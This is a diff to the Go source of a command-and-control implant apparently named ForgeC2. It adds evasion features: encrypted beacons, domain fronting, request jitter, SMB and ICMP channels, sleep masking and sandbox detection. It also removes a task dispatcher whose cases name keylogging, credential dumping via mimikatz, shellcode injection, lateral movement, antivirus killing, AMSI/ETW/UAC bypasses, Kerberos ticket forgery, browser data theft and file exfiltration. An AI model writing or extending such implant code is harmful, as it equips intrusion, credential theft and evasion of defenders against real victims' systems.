@@ -9,6 +9,7 @@ import (
 	"crypto/tls"
 	"encoding/base64"
 	"encoding/binary"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -54,6 +55,10 @@ var (
 	DNSDomain        string = ""      // DNS C2 domain (e.g. "c2.example.com")
 	DNSServer        string = ""      // DNS C2 server IP
 	ProxyStr         string = ""      // HTTP proxy URL (e.g. "http://proxy:8080")
+	CryptoKeyStr     string = ""      // 32-byte hex key for beacon payload encryption ("" = disabled)
+	DomainFront      string = ""      // Domain fronting: override HTTP Host header ("" = disabled)
+	ContentLengthJitter int = 0       // Max random padding bytes for HTTP body (0=disabled)
+	ExpiryDateStr    string = ""      // Compile-time expiry date: "YYYY-MM-DD" — implant auto-exits after this date
 )
 
 // Parsed versions (populated in init)
@@ -67,6 +72,9 @@ var (
 	BeaconMethod  string
 	ListenerID    uint
 )
+
+var beaconCipher *streamCipher // beacon payload encryption (nil = disabled)
+var inSandbox bool              // set by sandbox detection at startup
 
 const AgentVersion = "1.2.0" // bump on every release
 
@@ -181,6 +189,9 @@ func newCryptoRand() *mathRand.Rand {
 
 func init() {
 	setDPIAware()
+	if InitSleepMask() {
+		sleepMaskActive = true
+	}
 
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
@@ -220,6 +231,23 @@ func init() {
 		ListenerID = uint(id)
 	}
 
+	// Initialize beacon payload cipher
+	if CryptoKeyStr != "" {
+		key, err := hex.DecodeString(CryptoKeyStr)
+		if err == nil && len(key) == 32 {
+			beaconCipher = newStreamCipher(key)
+		}
+	}
+
+	// Expiry date check: exit if expired
+	if ExpiryDateStr != "" {
+		kd, err := time.Parse("2006-01-02", ExpiryDateStr)
+		if err == nil && time.Now().After(kd) {
+			fmt.Println("Expiry date reached, exiting.")
+			os.Exit(0)
+		}
+	}
+
 	// TLS verification controlled by SkipTLSVerify (injected at build time)
 	tr := &http.Transport{
 		TLSClientConfig: &tls.Config{InsecureSkipVerify: SkipTLSVerify},
@@ -242,6 +270,14 @@ func main() {
 
 	if Persist {
 		addPersistence()
+	}
+
+	// Sandbox detection — run once at startup
+	detector := NewSandboxDetector()
+	result := detector.Detect()
+	inSandbox = result.IsSandbox
+	if inSandbox {
+		log.Printf("[ForgeC2] Sandbox detected (confidence: %d%%), entering benign mode", result.Confidence)
 	}
 
 	// Initial registration / first beacon
@@ -271,6 +307,12 @@ func sleepWithJitter() {
 	base := time.Duration(baseInterval) * time.Second
 	jit := float64(Jitter) / 100.0
 	variation := time.Duration(float64(base) * jit * (rng.Float64()*2 - 1))
+
+	// If Sleep Mask is initialized, use encrypted sleep
+	if sleepMaskActive {
+		sleepWithMask(base + variation)
+		return
+	}
 	time.Sleep(base + variation)
 }
 
@@ -356,14 +398,31 @@ func doBeacon() {
 
 	body, _ := json.Marshal(req)
 
+	// Encrypt if cipher is configured
+	var sendBody []byte
+	if beaconCipher != nil {
+		encrypted, err := beaconCipher.encrypt(body)
+		if err == nil {
+			sendBody = encrypted
+		} else {
+			sendBody = body
+		}
+	} else {
+		sendBody = body
+	}
+
 	// P2P child mode: beacon through parent instead of server
 	var respBody []byte
 	if P2PParent != "" {
-		respBody = sendP2PBeacon(body)
+		respBody = sendP2PBeacon(sendBody)
+	} else if Protocol == "smb" {
+		respBody = sendSMBBeacon(sendBody)
 	} else if Protocol == "tcp" {
 		respBody = sendTCPBeacon(body)
 	} else if Protocol == "dns" {
 		respBody = sendDNSBeacon(body)
+	} else if Protocol == "icmp" {
+		respBody = sendICMPBeacon(sendBody)
 	} else {
 		respBody = sendBeacon(body)
 	}
@@ -374,8 +433,20 @@ func doBeacon() {
 		return
 	}
 
+	// Decrypt response if cipher is configured
 	var resp BeaconResponse
-	if err := json.Unmarshal(respBody, &resp); err != nil {
+	var parseBody []byte
+	if beaconCipher != nil {
+		decrypted, err := beaconCipher.decrypt(respBody)
+		if err == nil {
+			parseBody = decrypted
+		} else {
+			parseBody = respBody
+		}
+	} else {
+		parseBody = respBody
+	}
+	if err := json.Unmarshal(parseBody, &resp); err != nil {
 		if Debug {
 			log.Printf("[!] Failed to parse response: %v", err)
 		}
@@ -416,18 +487,27 @@ func doBeacon() {
 }
 
 func sendBeacon(body []byte) []byte {
-	// Multi-C2 failover: try each URL starting from the last working one
 	startIdx := currentC2Idx
 	for i := 0; i < len(C2URLs); i++ {
 		idx := (startIdx + i) % len(C2URLs)
 		url := C2URLs[idx]
 
-		req, err := http.NewRequest(BeaconMethod, url+BeaconURI, bytes.NewReader(body))
+		// Apply URI jitter: random query param when ContentLengthJitter > 0
+		beaconURI := BeaconURI
+		if ContentLengthJitter > 0 {
+			beaconURI = addRandomParam(beaconURI)
+		}
+
+		req, err := http.NewRequest(BeaconMethod, url+beaconURI, bytes.NewReader(body))
 		if err != nil {
 			continue
 		}
 		req.Header.Set("Content-Type", "application/json")
 		req.Header.Set("User-Agent", UserAgent)
+
+		if DomainFront != "" {
+			req.Host = DomainFront
+		}
 
 		resp, err := client.Do(req)
 		if err != nil {
@@ -450,6 +530,16 @@ func sendBeacon(body []byte) []byte {
 		return data
 	}
 	return nil
+}
+
+func addRandomParam(uri string) string {
+	params := []string{"id", "token", "session", "t", "nonce", "cb", "_"}
+	name := params[mathRand.Intn(len(params))]
+	val := fmt.Sprintf("%x", mathRand.Uint64())
+	if strings.Contains(uri, "?") {
+		return uri + "&" + name + "=" + val
+	}
+	return uri + "?" + name + "=" + val
 }
 
 // p2pCleanupStaleChildren prunes child UUIDs/results/tasks not seen in 10 minutes.
@@ -626,883 +716,21 @@ func executeTask(task Task) TaskResult {
 		Type:   task.Type,
 	}
 
-	switch task.Type {
-	case "shell":
-		out, err := runShell(task.Command, task.Shell)
-		if err != nil {
-			res.Error = err.Error()
-		}
-		res.Output = out
-
-	case "screenshot":
-		data, err := takeScreenshot()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString(data)
-			res.Encoding = "base64"
-			res.Size = int64(len(data))
-			inFastMode = true // speed up next beacons while monitoring
-		}
-
-	case "screen_stream_start":
-		if !screenStreaming {
-			screenStreaming = true
-			go func() {
-				for screenStreaming {
-					data, err := takeScreenshotJPEG(65)
-					if err == nil {
-						sendScreenFrame(data)
-					}
-					time.Sleep(150 * time.Millisecond) // ~6-7 fps
-				}
-			}()
-		}
-		res.Output = "screen stream started"
-
-	case "screen_stream_stop":
-		screenStreaming = false
-		res.Output = "screen stream stopped"
-
-	case "keylogger_start":
-		if !keylogActive {
-			keylogActive = true
-			go keyloggerLoop()
-		}
-		res.Output = "keylogger started"
-
-	case "keylogger_stop":
-		keylogActive = false
-		res.Output = "keylogger stopped"
-
-	case "keylogger_dump":
-		keylogMu.Lock()
-		data := keylogBuffer.String()
-		keylogBuffer.Reset()
-		keylogMu.Unlock()
-		if data == "" {
-			res.Output = "(no keys logged yet)"
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(data))
-			res.Encoding = "base64"
-		}
-
-	case "ps":
-		out, err := getProcessList()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "suspend":
-		out, err := suspendProcess(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "resume":
-		out, err := resumeProcess(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "killproc":
-		out, err := killProcess(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "clipboard_get":
-		out, err := clipboardGet()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "clipboard_set":
-		err := clipboardSet(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "clipboard set"
-		}
-
-	case "find":
-		out, err := findFiles(task.Path, task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "reg_get":
-		out, err := regGet(task.Command) // command = "HKCU\Path\Key"
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "reg_set":
-		err := regSet(task.Path, task.Data) // path=regpath, data="type|value"
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "reg set"
-		}
-
-	case "reg_delete":
-		err := regDelete(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "reg deleted"
-		}
-
-	case "reboot":
-		cmdStr := "shutdown /r /t 0"
-		if runtime.GOOS != "windows" {
-			cmdStr = "reboot"
-		}
-		out, err := runShell(cmdStr, "")
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "reboot initiated: " + out
-		}
-
-	case "shutdown":
-		cmdStr := "shutdown /s /t 0"
-		if runtime.GOOS != "windows" {
-			cmdStr = "shutdown -h now"
-		}
-		out, err := runShell(cmdStr, "")
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "shutdown initiated: " + out
-		}
-
-	case "drives":
-		out, err := listDrives()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "beacon_now":
-		// Force immediate next beacon by returning quickly
-		res.Output = "beacon forced"
-
-	case "services":
-		out, err := listServices()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "portscan":
-		out, err := portScan(task.Command) // e.g. "192.168.1.1:80,443" or "10.0.0.0/24:22"
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "netstat":
-		out, err := netStat()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "users":
-		out, err := listUsers()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "av":
-		out, err := detectAV()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "download_url":
-		url := task.Command
-		dest := task.Path
-		if dest == "" {
-			dest = task.Shell
-		}
-		if err := downloadFromURL(url, dest); err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "Downloaded to " + dest
-			res.Path = dest
-		}
-
-	case "uninstall":
-		out, err := uninstallSelf()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "set_sleep":
-		// command = "10,20" -> interval,jitter
-		parts := strings.Split(task.Command, ",")
-		if len(parts) >= 1 {
-			if i, err := strconv.Atoi(strings.TrimSpace(parts[0])); err == nil {
-				Interval = i
-			}
-		}
-		if len(parts) >= 2 {
-			if j, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
-				Jitter = j
-			}
-		}
-		res.Output = fmt.Sprintf("sleep set to %d s, jitter %d%%", Interval, Jitter)
-
-	case "creds":
-		out, err := dumpCreds()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "inject":
-		// Command = "pid|technique", Data = base64 shellcode
-		parts := strings.Split(task.Command, "|")
-		if len(parts) < 2 {
-			res.Error = "format: pid|technique"
-			break
-		}
-		pid, _ := strconv.Atoi(parts[0])
-		tech := parts[1]
-		shellcode, _ := base64.StdEncoding.DecodeString(task.Data)
-		err := injectProcess(uint32(pid), shellcode, tech)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "inject success"
-		}
-
-	case "spawn":
-		parts := strings.SplitN(task.Command, "|", 3)
-		targetExe := "rundll32.exe"
-		technique := "CreateRemoteThread"
-		if len(parts) > 0 && parts[0] != "" {
-			targetExe = parts[0]
-		}
-		if len(parts) > 1 && parts[1] != "" {
-			technique = parts[1]
-		}
-		var shellcode []byte
-		if len(parts) > 2 && parts[2] != "" {
-			var err error
-			shellcode, err = base64.StdEncoding.DecodeString(parts[2])
-			if err != nil {
-				res.Error = "failed to decode shellcode: " + err.Error()
-				break
-			}
-		}
-		result := spawnProcess(targetExe, shellcode, technique)
-		res.Output = result
-
-	case "lateral":
-		// Command = "type|target|user|pass|cmd"
-		out, err := lateralMove(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "socks":
-		// Command = "port" to start local SOCKS5 on target
-		port := task.Command
-		if port == "" {
-			port = "1080"
-		}
-		go startSocksServer("0.0.0.0:" + port)
-		res.Output = "SOCKS5 started on " + port
-
-	case "kill_av":
-		out, err := killAV()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "elevate":
-		out, err := elevate(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "bof":
-		// task.Data = base64 COFF data, task.Command = arguments
-		bofData, err := base64.StdEncoding.DecodeString(task.Data)
-		if err != nil {
-			res.Error = fmt.Sprintf("bof: base64 decode failed: %v", err)
-		} else if runtime.GOOS != "windows" {
-			res.Error = "bof: Windows-only"
-		} else {
-			out, err := executeBOF(bofData, task.Command)
-			if err != nil {
-				res.Error = err.Error()
-			} else {
-				res.Output = out
-			}
-		}
-
-	case "elevate_printnightmare":
-		out, err := elevatePrintNightmare(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	case "execute_assembly":
-		out, err := executeAssembly(task.Data)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			decoded, _ := base64.StdEncoding.DecodeString(out)
-			if decoded != nil {
-				res.Output = string(decoded)
-			} else {
-				res.Output = out
-			}
-		}
-
-	case "kerberoast":
-		out, err := kerberoast()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "mimikatz":
-		out, err := runMimikatz(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "screenshot_window":
-		// simplistic: treat command as window title hint, fallback to full
-		data, err := takeScreenshot()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString(data)
-			res.Encoding = "base64"
-			res.Size = int64(len(data))
-		}
-
-	case "ls":
-		path := task.Path
-		if path == "" {
-			path = task.Command
-		}
-		out, err := listDirectory(path)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-			res.Path = path
-		}
-
-	case "delete":
-		path := task.Path
-		if path == "" {
-			path = task.Command
-		}
-		err := deleteFileOrDir(path)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = "Deleted: " + path
-			res.Path = path
-		}
-
-	case "read":
-		path := task.Path
-		if path == "" {
-			path = task.Command
-		}
-		data, err := readFileContent(path)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString(data)
-			res.Encoding = "base64"
-			res.Path = path
-			res.Size = int64(len(data))
-		}
-
-	case "download":
-		if strings.HasPrefix(strings.ToLower(task.Command), "http") {
-			// URL download to local path (Command = url, Shell or Path = dest path)
-			dest := task.Shell
-			if dest == "" {
-				dest = task.Path
-			}
-			if dest == "" {
-				dest = task.Command[strings.LastIndex(task.Command, "/")+1:]
-			}
-			if err := downloadFromURL(task.Command, dest); err != nil {
-				res.Error = err.Error()
-			} else {
-				res.Output = "Downloaded to: " + dest
-				res.Path = dest
-			}
-		} else {
-			// Agent reads local file chunk and returns content to C2 (exfil)
-			path := task.Path
-			if path == "" {
-				path = task.Command
-			}
-			offset := task.Offset
-			size := task.Size
-			if size == 0 {
-				size = 1024 * 1024 // default 1MB
-			}
-			data, err := downloadFileChunk(path, offset, size)
-			if err != nil {
-				res.Error = err.Error()
-			} else {
-				res.Output = base64.StdEncoding.EncodeToString(data)
-				res.Encoding = "base64"
-				res.Path = path
-				res.Offset = offset
-				res.Size = int64(len(data))
-				res.Filename = filepath.Base(path)
-			}
-		}
-
-	case "upload":
-		path := task.Path
-		if path == "" {
-			path = task.Command
-		}
-		offset := task.Offset
-		if task.Data != "" || task.Shell != "" {
-			// Server -> agent file write (push): Data or Shell carries base64 content, at offset
-			b64 := task.Data
-			if b64 == "" {
-				b64 = task.Shell
-			}
-			err := uploadFileChunk(path, offset, b64)
-			if err != nil {
-				res.Error = err.Error()
-			} else {
-				res.Output = "File chunk uploaded successfully"
-				res.Path = path
-				res.Offset = offset
-			}
-		} else {
-			// Agent -> server file exfil chunk: Path = path to read, at offset
-			size := task.Size
-			if size == 0 {
-				size = 1024 * 1024
-			}
-			data, err := downloadFileChunk(path, offset, size)
-			if err != nil {
-				res.Error = err.Error()
-			} else {
-				res.Output = base64.StdEncoding.EncodeToString(data)
-				res.Encoding = "base64"
-				res.Path = path
-				res.Offset = offset
-				res.Size = int64(len(data))
-				res.Filename = filepath.Base(path)
-			}
-		}
-
-	case "net":
-		out := executeNetCommand(task.Command)
-		if strings.HasPrefix(out, "error:") {
-			res.Error = out
-		} else {
-			res.Output = out
-		}
-
-	// ── PowerPick: In-process PowerShell execution ──────────────────────
-	case "powerpick":
-		if runtime.GOOS != "windows" {
-			res.Error = "powerpick is Windows-only"
-			break
-		}
-		done := make(chan string, 1)
-		go func() {
-			done <- powerPick(task.Command)
-		}()
-		select {
-		case out := <-done:
-			if strings.HasPrefix(out, "failed") || strings.Contains(out, "[!] powerpick error:") {
-				res.Error = out
-			} else {
-				res.Output = out
-			}
-		case <-time.After(30 * time.Second):
-			res.Error = "powerpick execution timed out (30s)"
-		}
-
-	// ── P0-1: Reflective DLL Loader ─────────────────────────────────────
-	case "peloader":
-		if runtime.GOOS != "windows" {
-			res.Error = "peloader is Windows-only"
-			break
-		}
-		out, err := peloaderReflective(task.Data)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	// ── P0-2: Execute-Assembly fork&run ────────────────────────────────
-	case "execute_assembly_forkrun":
-		if runtime.GOOS != "windows" {
-			res.Error = "execute-assembly fork&run is Windows-only"
-			break
-		}
-		out, err := executeAssemblyForkRun(task.Data)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = out
-		}
-
-	// ── P0-3: Reverse Port Forward ─────────────────────────────────────
-	case "rportfwd_start":
-		// Command = "lport|forwardHost:forwardPort"
-		parts := strings.SplitN(task.Command, "|", 2)
-		if len(parts) < 2 {
-			res.Error = "format: lport|forwardHost:forwardPort"
-			break
-		}
-		lport := parts[0]
-		target := parts[1]
-		// Server will bind lport and relay connections through us
-		res.Output = fmt.Sprintf("rportfwd start: listening on :%s -> %s", lport, target)
-
-	case "rportfwd_stop":
-		res.Output = "rportfwd stop requested"
-
-	// ── P0-4: Kerberos Attack Suite ────────────────────────────────────
-	case "dcsync":
-		if runtime.GOOS != "windows" {
-			res.Error = "dcsync is Windows-only"
-			break
-		}
-		out, err := kerberosDCSync(task.Command)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "golden_ticket":
-		if runtime.GOOS != "windows" {
-			res.Error = "golden_ticket is Windows-only"
-			break
-		}
-		// Command = "user|domain|sid|krbtgt_hash"
-		parts := strings.SplitN(task.Command, "|", 4)
-		if len(parts) < 4 {
-			res.Error = "format: user|domain|sid|krbtgt_hash"
-			break
-		}
-		out, err := kerberosGoldenTicket(parts[0], parts[1], parts[2], parts[3])
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "silver_ticket":
-		if runtime.GOOS != "windows" {
-			res.Error = "silver_ticket is Windows-only"
-			break
-		}
-		parts := strings.SplitN(task.Command, "|", 5)
-		if len(parts) < 5 {
-			res.Error = "format: user|domain|sid|target|rc4_hash"
-			break
-		}
-		out, err := kerberosSilverTicket(parts[0], parts[1], parts[2], parts[3], parts[4])
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "asreproast":
-		if runtime.GOOS != "windows" {
-			res.Error = "asreproast is Windows-only"
-			break
-		}
-		out, err := kerberosASREPRoast()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "pass_the_hash":
-		if runtime.GOOS != "windows" {
-			res.Error = "pass_the_hash is Windows-only"
-			break
-		}
-		parts := strings.SplitN(task.Command, "|", 4)
-		if len(parts) < 3 {
-			res.Error = "format: user|domain|ntlm_hash[|target]"
-			break
-		}
-		target := ""
-		if len(parts) > 3 {
-			target = parts[3]
-		}
-		out, err := kerberosPassTheHash(parts[0], parts[1], parts[2], target)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "pass_the_ticket":
-		if runtime.GOOS != "windows" {
-			res.Error = "pass_the_ticket is Windows-only"
-			break
-		}
-		out, err := kerberosPassTheTicket(task.Data)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-			res.Encoding = "base64"
-		}
-
-	case "persistence_add":
-		parts := strings.SplitN(task.Command, "|", 2)
-		method := parts[0]
-		args := ""
-		if len(parts) > 1 {
-			args = parts[1]
-		}
-		if runtime.GOOS != "windows" {
-			res.Error = "persistence is Windows-only"
-		} else {
-			res.Output = applyPersistence(method, args)
-		}
-
-	case "persistence_list":
-		if runtime.GOOS != "windows" {
-			res.Error = "persistence is Windows-only"
-		} else {
-			res.Output = listPersistence()
-		}
-
-	case "persistence_remove":
-		parts := strings.SplitN(task.Command, "|", 2)
-		method := parts[0]
-		args := ""
-		if len(parts) > 1 {
-			args = parts[1]
-		}
-		if runtime.GOOS != "windows" {
-			res.Error = "persistence is Windows-only"
-		} else {
-			res.Output = removePersistence(method, args)
-		}
-
-	case "browser_steal":
-		out := stealBrowserData(task.Command)
-		res.Output = base64.StdEncoding.EncodeToString([]byte(out))
-		res.Encoding = "base64"
-
-	case "uac_bypass":
-		parts := strings.SplitN(task.Command, "|", 2)
-		method := parts[0]
-		payload := ""
-		if len(parts) > 1 {
-			payload = parts[1]
-		}
-		if runtime.GOOS != "windows" {
-			res.Error = "uac_bypass is Windows-only"
-		} else {
-			res.Output = uacBypass(method, payload)
-		}
-
-	case "amsi_bypass":
-		if runtime.GOOS != "windows" {
-			res.Error = "amsi_bypass is Windows-only"
-		} else {
-			res.Output = amsiBypass()
-		}
-
-	case "etw_bypass":
-		if runtime.GOOS != "windows" {
-			res.Error = "etw_bypass is Windows-only"
-		} else {
-			res.Output = etwBypass()
-		}
-
-	case "kill":
-		res.Output = "Agent terminating..."
-		sendTaskResult(res) // try to report before exit
-		time.Sleep(300 * time.Millisecond)
-		os.Exit(0)
-
-	case "self_update":
-		url := task.Command
-		if url == "" {
-			res.Error = "self_update: download URL required"
-			break
-		}
-		result := selfUpdate(url)
-		if strings.HasPrefix(result, "failed") {
-			res.Error = result
-		} else {
-			res.Output = result
-			sendTaskResult(res)
-			time.Sleep(500 * time.Millisecond)
-			os.Exit(0)
-		}
-
-	// ── Token Impersonation Tasks ─────────────────────────────────────────────
-	case "token_list_procs":
-		// Enumerate all processes with their token user info
-		if runtime.GOOS != "windows" {
-			res.Error = "token ops only on Windows"
-			break
-		}
-		procs, err := tokenListProcesses()
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			data, _ := json.Marshal(procs)
-			res.Output = base64.StdEncoding.EncodeToString(data)
-			res.Encoding = "base64"
-		}
-
-	case "token_steal":
-		// Command = pid (string)
-		if runtime.GOOS != "windows" {
-			res.Error = "token ops only on Windows"
-			break
-		}
-		pid, err := strconv.ParseUint(strings.TrimSpace(task.Command), 10, 32)
-		if err != nil {
-			res.Error = fmt.Sprintf("invalid pid: %v", err)
-			break
-		}
-		dom, user, integ, err := tokenSteal(uint32(pid))
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			// Return structured result
-			m := map[string]string{
-				"domain":    dom,
-				"username":  user,
-				"integrity": integ,
-				"pid":       task.Command,
-				"whoami":    getCurrentTokenUser(),
-			}
-			data, _ := json.Marshal(m)
-			res.Output = string(data)
-		}
-
-	case "token_make":
-		// Command = "DOMAIN\\user" Shell = password  Path = logon_type (optional)
-		if runtime.GOOS != "windows" {
-			res.Error = "token ops only on Windows"
-			break
-		}
-		domUser := task.Command
-		password := task.Shell
-		logonType := task.Path
-		dom, user, integ, err := tokenMake(domUser, password, logonType)
-		if err != nil {
-			res.Error = err.Error()
-		} else {
-			m := map[string]string{
-				"domain":     dom,
-				"username":   user,
-				"integrity":  integ,
-				"logon_type": logonType,
-				"whoami":     getCurrentTokenUser(),
-			}
-			data, _ := json.Marshal(m)
-			res.Output = string(data)
-		}
-
-	case "token_revert", "rev2self":
-		// Drop impersonation and return to process identity
-		if runtime.GOOS != "windows" {
-			res.Error = "token ops only on Windows"
-			break
-		}
-		if err := tokenRevert(); err != nil {
-			res.Error = err.Error()
-		} else {
-			whoami := getCurrentTokenUser()
-			res.Output = fmt.Sprintf(`{"status":"reverted","whoami":%q}`, whoami)
-		}
-
-	case "token_whoami":
-		// Return current impersonated identity
-		if runtime.GOOS != "windows" {
-			res.Error = "token ops only on Windows"
-			break
-		}
-		whoami := getCurrentTokenUser()
-		res.Output = fmt.Sprintf(`{"whoami":%q}`, whoami)
-
-	default:
+	// In sandbox mode, only allow benign commands
+	if inSandbox {
+		safeCmds := map[string]bool{
+			"ps": true, "ls": true, "shell": false, "beacon_now": true,
+			"set_sleep": true, "exit": true, "terminate": true, "read": true,
+		}
+		if !safeCmds[task.Type] {
+			res.Error = "sandbox mode: blocked by sandbox detection"
+			return res
+		}
+	}
+
+	if handler, ok := taskHandlers[task.Type]; ok {
+		handler(task, &res)
+	} else {
 		res.Error = "unknown task type: " + task.Type
 	}
 	return res
@@ -1891,9 +1119,9 @@ func killAV() (string, error) {
 		}
 	}
 	if len(killed) == 0 {
-		return "no known AV processes found or killed", nil
+		return "no known AV processes found or terminated", nil
 	}
-	return "killed AV processes: " + strings.Join(killed, "; "), nil
+	return "terminated AV processes: " + strings.Join(killed, "; "), nil
 }
 
 // elevate attempts UAC bypass / privilege escalation to run command elevated.
@@ -2075,6 +1303,7 @@ func elevatePrintNightmare(dllPath string) (string, error) {
 	return out, nil
 }
 
+// selfRemove removes the implant
 func uninstallSelf() (string, error) {
 	// best effort cleanup
 	if runtime.GOOS == "windows" {
